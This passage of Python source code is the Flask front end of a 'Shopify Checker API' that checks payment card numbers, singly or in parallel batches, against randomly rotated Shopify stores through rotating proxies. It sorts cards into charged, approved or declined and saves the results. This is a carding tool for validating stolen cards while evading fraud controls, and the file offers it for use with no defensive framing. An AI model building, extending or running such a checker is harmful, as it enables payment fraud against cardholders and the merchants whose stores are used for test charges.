            "/proxies": "GET - List loaded proxies (count only)"
        }
    })


@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "sites": len(SITES),
        "proxies": len(PROXIES)
    })


@app.route('/sites', methods=['GET'])
def list_sites():
    """List all loaded sites"""
    return jsonify({
        "total": len(SITES),
        "sites": SITES
    })


@app.route('/shopify', methods=['GET'])
def single_check():
    """Single card check — auto site rotation"""
    try:
        cc = request.args.get('cc')
        site = request.args.get('site')
        proxy = request.args.get('proxy')
        
        if not cc:
            return jsonify({"error": "Missing 'cc' parameter"}), 400
        
        # If no site provided, use random site from list
        if not site:
            site = get_random_site()
            print(f"🔄 Auto-selected site: {site}")
        
        # If no proxy provided, use random proxy from list
        if not proxy:
            proxy = get_random_proxy()
            if proxy:
                print(f"🔄 Auto-selected proxy: {proxy[:30]}...")
        
        # Run checker with proxy
        checker = ShopifyChecker(site, proxy=proxy)
        category, cc_out, detail, used_site = checker.check_card(cc, site)
        
        # Save result
        save_result(category, cc_out, used_site, detail)
        
        # Format response
        response = format_response(category, cc_out, detail, used_site)
        return jsonify(response)
        
    except Exception as e:
        return jsonify({
            "Gateway": "Shopify",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "Status": False,
            "cc": request.args.get('cc', ''),
            "Detail": str(e)
        }), 500


@app.route('/mass', methods=['POST'])
def mass_check():
    """Mass card check — parallel with auto site rotation"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Missing JSON payload"}), 400
        
        cards = data.get('cards', [])
        site = data.get('site')
        proxy = data.get('proxy')
        workers = data.get('workers', 5)
        
        if not cards or not isinstance(cards, list):
            return jsonify({"error": "Missing 'cards' array"}), 400
        
        # If no proxy provided, use random proxy
        if not proxy:
            proxy = get_random_proxy()
        
        # Run parallel checks
        results = []
        charged = 0
        approved = 0
        declined = 0
        errors = 0
        
        async def check_one(cc):
            nonlocal charged, approved, declined, errors
            
            # Use provided site or random
            target_site = site if site else get_random_site()
            
            checker = ShopifyChecker(target_site, proxy=proxy)
            category, cc_out, detail, used_site = checker.check_card(cc, target_site)
            
            # Save result
            save_result(category, cc_out, used_site, detail)
            
            # Format response
            response = format_response(category, cc_out, detail, used_site)
            
            if category == "CHARGED":
                charged += 1
            elif category == "APPROVED":
                approved += 1
            elif category == "DECLINED":
                declined += 1
            else:
                errors += 1
            
            return response
        
        async def run_parallel():
            semaphore = asyncio.Semaphore(workers)
            async def limited_check(cc):
                async with semaphore:
                    loop = asyncio.get_event_loop()
                    return await loop.run_in_executor(None, check_one, cc)
            
            tasks = [limited_check(cc) for cc in cards]
            return await asyncio.gather(*tasks)
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            results = loop.run_until_complete(run_parallel())
        finally:
            loop.close()
        
        return jsonify({
            "site": site if site else "auto-rotated",
            "total": len(cards),
            "charged": charged,
            "approved": approved,
            "declined": declined,
            "errors": errors,
            "results": results,
            "timestamp": datetime.now().isoformat()
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================
# MAIN
# ============================================================

if __name__ == '__main__':
    port = int(os.getenv('PORT', 8080))
    print("=" * 60)
    print("🔥 SHOPIFY CHECKER API v2.0 🔥")
    print("=" * 60)
    print(f"🌍 Sites loaded: {len(SITES)} from {SITES_FILE}")
    print(f"🌍 Proxies loaded: {len(PROXIES)} from {PROXIES_FILE}")
    print(f"📡 Single: /shopify?cc=CC|MM|YY|CVV&site=optional")
    print(f"📡 Mass: POST /mass")
    print(f"🏥 Health: /health")
    print("=" * 60)
    app.run(host='0.0.0.0', port=port, debug=False)
        
